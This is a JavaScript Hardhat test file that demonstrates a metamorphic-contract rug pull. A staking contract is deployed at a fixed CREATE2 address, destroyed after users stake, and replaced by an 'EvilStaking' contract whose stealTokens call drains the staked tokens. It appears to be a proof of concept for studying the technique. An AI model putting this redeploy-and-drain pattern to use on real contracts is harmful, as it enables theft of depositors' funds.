const { assert, ethers } = require("hardhat");
const { expect } = require("chai");
const { Contract } = require("ethers");

// deploy contract
async function deployContract(contractName) {
    const Contract = await ethers.getContractFactory(contractName);
    let contract = await Contract.deploy()
    console.log("TXN Hash: ", contract.deployTransaction.hash);

    await contract.deployed()
    console.log("Contract Address: ", contract.address)

    return contract
}


describe("Contract", async function(){

    let SALT = 1;

    let accounts;
    let owner;

    let HonestERC20;
    let RewardToken;
    let MetamorphicFactory;

    let HonestStaking;
    let EvilStaking;

    let METAMORPHIC_CONTRACT_ADDRESS;


    before(async function(){
        this.timeout(0)

        // set contract owner/deployer
        accounts = await ethers.getSigners();
        owner = accounts[0].address
        console.log("Owner Account: " + owner)

        // deploy metamorphic contract factory
        MetamorphicFactory = await deployContract("MetamorphicFactory")

        // get deterministic metamorphic conctract address
        METAMORPHIC_CONTRACT_ADDRESS = await MetamorphicFactory.getMetamorphicContractAddress(SALT)

        // deploy staking Honest ERC20 token and rewards token contract
        HonestERC20 = await deployContract("HonestERC20")
        RewardToken = await deployContract("RewardToken")

        // mint Reward tokens to staking contract so it has a positive balance 
        await RewardToken.mint(METAMORPHIC_CONTRACT_ADDRESS, 1000000000)

        // mint myself some HonestERC20
        await HonestERC20.mint(owner, 10000)

        
        // get contract factory for honest and bad staking contracts
        HonestStaking = await ethers.getContractFactory("HonestStaking");
        EvilStaking = await ethers.getContractFactory("EvilStaking");


    })

    describe("Simple Tests", function(){
        this.timeout(0)


        it("Deploy an Honest Staking Contract and ensure tokens are set ", async()=>{

            let metamorphicContractInitFuncCall = HonestStaking.interface.encodeFunctionData("setStakingAndRewardTokens", [HonestERC20.address, RewardToken.address])
            
            await MetamorphicFactory.deployMetamorphicContract(SALT, HonestStaking.bytecode, metamorphicContractInitFuncCall)

            let honestContract = new Contract(METAMORPHIC_CONTRACT_ADDRESS, HonestStaking.interface, accounts[0])
            let rewardTokenAddress = await honestContract.rewardsToken()
            let stakingTokenAddress = await honestContract.stakingToken()

            expect(rewardTokenAddress).to.eq(RewardToken.address)
            expect(stakingTokenAddress).to.eq(HonestERC20.address)
          
        })


        it("stake tokens in the Honest Staking Contract", async()=>{

            let honestStakingContract = new Contract(METAMORPHIC_CONTRACT_ADDRESS, HonestStaking.interface, accounts[0])
            
        
            await HonestERC20.approve(METAMORPHIC_CONTRACT_ADDRESS, 10000)
            await honestStakingContract.stake(10000)
            

            // mine next block
            await network.provider.send("evm_mine") 
            await network.provider.send("evm_mine") 


            let earned = await honestStakingContract.earned(owner) //(owner)
            console.log(earned)

            let balance = await HonestERC20.balanceOf(METAMORPHIC_CONTRACT_ADDRESS)
            expect(balance.toNumber()).to.eq(10000)
        })



        it("kill the HonestStaking contract but check that its balance is still 10000 in honestERC20 contract", async()=>{

            let honestContract = new Contract(METAMORPHIC_CONTRACT_ADDRESS, HonestStaking.interface, accounts[0])

            await honestContract.kill()

            let balance = await HonestERC20.balanceOf(METAMORPHIC_CONTRACT_ADDRESS)
            expect(balance.toNumber()).to.eq(10000)

        })



        it("deploy the EvilStaking contract to replace the HonestStaking contract", async()=>{

            let metamorphicContractInitFuncCall = HonestStaking.interface.encodeFunctionData("setStakingAndRewardTokens", [HonestERC20.address, RewardToken.address])
            
            await MetamorphicFactory.deployMetamorphicContract(SALT, EvilStaking.bytecode, metamorphicContractInitFuncCall)


            let evilContract = new Contract(METAMORPHIC_CONTRACT_ADDRESS, EvilStaking.interface, accounts[0])

            let balance = await evilContract.checkStakedBalance()
            expect(balance.toNumber()).to.eq(10000)

        })



        it("steal staked tokens in the evil staking contract", async()=>{

            let evilContract = new Contract(METAMORPHIC_CONTRACT_ADDRESS, EvilStaking.interface, accounts[0])
            
            await evilContract.stealTokens(owner)


            let balance = await evilContract.checkStakedBalance()
            expect(balance.toNumber()).to.eq(0)
            

            let stealerBalance = await HonestERC20.balanceOf(owner)
            expect(stealerBalance.toNumber()).to.eq(10000)

        })


    })
})